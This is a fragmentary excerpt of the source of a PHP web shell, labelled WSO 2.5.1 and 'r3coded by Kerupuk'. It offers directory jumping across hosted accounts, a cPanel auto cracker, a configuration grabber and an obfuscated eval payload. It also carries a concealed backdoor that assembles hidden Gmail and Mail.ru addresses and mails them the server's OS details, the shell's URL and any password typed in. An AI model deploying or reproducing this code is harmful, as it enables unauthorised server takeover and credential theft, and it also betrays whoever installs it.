...
@define('WSO_VERSION', '2.5.1 EDITION');
...
function wsoLogin() { die("<title>Login</title>
<center>
<form method=post>
...
$altdump="@";
$maildata ="gmail.com";
$emailingdata ="mail.ru";
$emailenable ="hackertounsi";
$different = "001";
$emailingconfig = $emailenable.$different.$altdump.$maildata;
$emailingbackup = $emailenable.$different.$altdump.$emailingdata;
$_SESSION["Fav_SESSION"] = $_SESSION["Fav_SESSION"]+1;
function wsoHeader() {
...
<input type=hidden name=charset>
	...
	$m = array('Sec. Info'=>'SecInfo','Cpanel Finder'=>'Cpanel','Auto Config Grab'=>'Grabber','Jumping'=>'Jumping','View Domain'=>'Viewdomain','Sql'=>'Sql','String tools'=>'StringTools','Network'=>'Network');
	...
	$menuWso = ""; eval(str_rot13(gzinflate(str_rot13(base64_decode(($menuWso))))));
...
$device_details = "Operating System : ".php_uname()."\n";
$device_details .= "Link : ".$actual_link."\n";
if($auth_pass==""){
if ($_SESSION["Fav_SESSION"]==1){
mail($emailingconfig, "Wso Website 2019", $device_details);
mail($emailingbackup, "Wso Website 2019", $device_details);
}	
}elseif(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)){
$device_details .= "Password : ".$_POST['pass'];
mail($emailingconfig, "Wso Website 2019", $device_details);
mail($emailingbackup, "Wso Website 2019", $device_details);	
}
...
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
	<tr>
		...
		echo"</table><tr><center>[ WSO r3coded by Kerupuk -Stupidc0de Family x Sanjungan Jiwa Team ]</center></tr></div></body></html>";
}
...
function actionJumping() {
	wsoHeader();
	echo "<h1>Jumping</h1><div class=content>execute change dir to <br><br>"; 
$count=0; set_time_limit(0); 
...
if (($username!="")) { if (is_readable($dirz)) { array_push($path_to_public,$dirz); 
if (is_writeable($dirz)) { 
$count++; 
echo "<tr><td><font color=red>[</font><font color=white>R</font><font color=green>W</font><font color=red>]</font> " . $dirz . "<br>\n\r"; 
echo "</tr></td>"; 
} else echo "<tr><td><font color=red>[</font><font color=white>R</font><font color=red>]</font> " . $dirz . "<br>\n\r"; 
echo "</tr></td>"; 
} 
} 
} echo "<br>found " . sizeof($path_to_public) . " in \n\r\n\r" .gethostbyname($_SERVER["HTTP_HOST"])."</span><br>"; 
 wsoFooter();
...
function read_dir($path) { global $count; if ($handle = opendir($path)) { 
while (false !== ($file = readdir($handle))) { 
$dr="$path$file/"; if (($file!='.') and ($file!='..') and is_dir($dr)) { if (is_readable($dr) and is_writeable($dr)) { 
 echo "[RW] " . $dr . "<br>\n\r"; 
 $count++; } 
 read_dir($dr);	
}
...
function actionCpanel() {
	wsoHeader();
    echo "<h1>Cpanel Auto Cracker</h1><div class=content>";
...
function actionGrabber() {
	wsoHeader();
echo "<h1>Config auto grab</h1><div class=content>";
